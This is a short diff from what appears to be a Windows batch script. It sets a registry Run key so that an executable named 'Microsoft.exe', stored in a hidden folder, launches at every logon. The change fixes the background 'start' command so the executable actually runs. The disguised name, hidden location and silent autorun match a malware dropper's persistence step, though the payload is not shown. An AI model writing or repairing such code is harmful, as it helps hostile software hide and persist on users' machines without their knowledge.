@@ -125,6 +125,6 @@ rem attrib +h +s "%hiddenFolder2%\Microsoft.exe"
 REM Add registry key to start Microsoft.exe on boot
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
 
-start /B "%hiddenFolder2%\Microsoft.exe"
+start /B "" "%hiddenFolder2%\Microsoft.exe"
 
 goto :eof
